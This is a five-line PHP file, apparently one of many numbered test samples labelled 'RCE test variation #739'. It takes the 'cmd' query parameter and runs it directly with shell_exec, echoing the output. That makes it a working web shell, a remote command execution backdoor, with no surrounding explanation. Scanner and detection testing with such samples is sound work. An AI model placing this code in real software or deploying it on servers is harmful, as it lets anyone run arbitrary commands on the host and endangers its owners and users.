<?php
// RCE test variation #739
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>